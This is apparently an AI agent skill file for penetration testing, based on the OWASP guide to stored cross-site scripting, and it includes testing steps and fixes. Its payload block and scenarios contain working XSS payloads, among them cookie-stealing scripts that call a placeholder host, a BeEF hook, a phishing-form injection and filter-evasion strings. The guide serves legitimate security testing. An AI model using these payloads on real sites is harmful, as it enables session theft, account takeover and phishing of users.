---
name: xss-stored
description: >
  Stored XSS (persistent XSS) occurs when attacker-supplied input is saved server-side and later rendered unencoded to other users. Common injection points include profile fields, comments, forum posts, file upload filenames, and application logs. Detect via PHP `$_GET/$_POST/$_REQUEST/$_FILES`, ASP `Request.Form`, JSP `request.getParameter`, and BeEF hook injection. Tools: Burp Suite, OWASP ZAP, BeEF, PHP Charset Encoder, Hackvertor.
license: MIT
compatibility: Designed for Claude Code. Requires Burp Suite or OWASP ZAP.
metadata:
  category: web
  version: "0.1"
  source: https://owasp.org/www-project-web-security-testing-guide/stable/
  source_types: framework
  wstg: WSTG-INPV-02
---

# Stored Cross-Site Scripting (XSS)

## What Is Broken and Why
Stored XSS persists because user-supplied content is saved to a database or file system and later retrieved and rendered without output encoding. Unlike reflected XSS, no social engineering link is needed — every user who views the affected page triggers the payload. High-privilege pages (admin panels, audit logs, user management) that display stored user input are particularly dangerous as they can lead to full application compromise.

## Key Signals
- User-controlled fields stored and redisplayed: names, bios, comments, addresses, file names
- Email fields, address fields, or free-text inputs that appear elsewhere in the UI
- Admin panels or logs that display raw user-submitted data
- File upload features that reflect filename or metadata in the browser
- Shopping cart items, support ticket content, or CMS posts rendered to other users
- Source variables: PHP `$_GET`, `$_POST`, `$_REQUEST`, `$_FILES`; ASP `Request.QueryString`, `Request.Form`; JSP `request.getParameter`, `doGet`, `doPost`

## Methodology
1. Map all storage points: forms, API endpoints, file uploads, profile settings.
2. Submit a canary string (e.g., `storedxss1234`) to each storage point.
3. Visit every page where the stored data is rendered (profile view, admin panel, logs, reports).
4. Search response for unencoded canary; determine HTML context.
5. Submit a context-appropriate XSS payload.
6. View the rendering page in a real browser to confirm execution.
7. Test second-order sinks: exported CSV/Excel, PDF reports, admin notifications, email templates.
8. Test via proxy to bypass client-side validation (disable JS or intercept request).
9. Escalate: hook with BeEF, exfiltrate session cookies, perform actions as victim.

## Payloads & Tools
```
# Basic stored payload (comment/bio field)
<script>alert(document.cookie)</script>

# Cookie exfiltration to attacker server
<script>new Image().src='http://VICTIM/steal?c='+encodeURIComponent(document.cookie)</script>

# BeEF hook injection (replace TOKEN with actual BeEF hook URL path)
<script src="http://VICTIM/hook.js"></script>

# Email field injection (URL-encoded for proxy submission)
TARGET-EMAIL%40domain.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E

# File upload XSS via Content-Type manipulation
# Send multipart upload with:
Content-Disposition: form-data; name="uploadfile1"; filename="test.gif"
Content-Type: text/html

<script>alert(document.cookie)</script>

# SVG file upload XSS
# Upload file named payload.svg:
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>

# Bypass client-side validation with Burp:
# 1. Submit valid data in browser
# 2. Intercept with Burp, modify payload in the request body
# 3. Forward modified request

# Confirm server-side storage:
curl -s -b "SESSION=TOKEN" TARGET/profile | grep -i "storedxss1234"
```

## Bypass Techniques
- Intercept and modify requests with Burp/ZAP to bypass client-side input length limits and regex filters
- Use alternate script tags: `<svg onload=alert(1)>`, `<img src=x onerror=alert(1)>`, `<body onload=alert(1)>`
- URL-encoded submission when server reads raw URL-decoded values
- Exploit second-order rendering: submit safe text that becomes executable when processed (e.g., Markdown `[text](javascript:alert(1))`)
- File upload: rename `.html` or `.svg` files to allowed extensions if MIME validation is absent server-side
- Strip filter evasion: `<sc<script>ript>alert(1)</sc</script>ript>`
- Polyglot payloads for multiple contexts simultaneously

## Exploitation Scenarios
**Scenario 1 — Admin Panel Compromise via Comment**
Setup: Blog comment field stored and displayed in admin moderation panel without encoding.
Trigger: Attacker posts comment: `<script>document.location='http://VICTIM/steal?c='+document.cookie</script>`
Impact: Admin cookie stolen when moderating; attacker gains admin session.

**Scenario 2 — Mass User Compromise via Profile Bio**
Setup: User profile bio rendered on every page the user visits and on follower feeds.
Trigger: Attacker sets bio to `<script>new Image().src='http://VICTIM/c?x='+document.cookie</script>`
Impact: Every user who views attacker's profile loses their session cookie.

**Scenario 3 — File Upload XSS Leading to Phishing**
Setup: Profile picture upload stores filename in database; filename displayed in image alt text without encoding.
Trigger: Upload file named `"><img src=x onerror="document.body.innerHTML='<form action=http://VICTIM/phish>...'">`.gif
Impact: Login form replaced with attacker-controlled phishing form for all profile viewers.

## False Positives
- Stored content that is HTML-encoded at display time (verify execution in browser, not just source)
- Stored payloads inside HTML comments with no execution path
- Fields stored but only ever returned to the same authenticated user (self-XSS; limited impact without chaining)
- Server-side sanitization that strips tags but leaves canary text intact

## Fix Patterns
- Output encode all stored user data at render time using context-appropriate encoding (HTML, JS, CSS, URL)
- Validate and sanitize on input as defense-in-depth (allowlist over blocklist)
- For rich text: use a dedicated HTML sanitization library (e.g., DOMPurify), never raw innerHTML
- For file uploads: validate MIME type server-side, rename files to random names, serve from a separate origin
- Content Security Policy: `script-src 'self'` prevents inline and external script injection
- Restrict admin/log pages from rendering raw user-submitted data

## Related Skills

Stored XSS delivers a persistent payload that [[xss-reflected]] cannot achieve without a victim clicking a crafted link. It chains naturally into [[csrf]]: a stored payload can extract CSRF tokens or submit forged requests on behalf of every user who views the affected page, making account takeover fully automated. A session cookie exposed via stored XSS is the target of [[cookie-attacks]] — ensure `HttpOnly` is the defense. If the stored content is rendered in a JS template, the [[dom-xss]] sink analysis also applies.
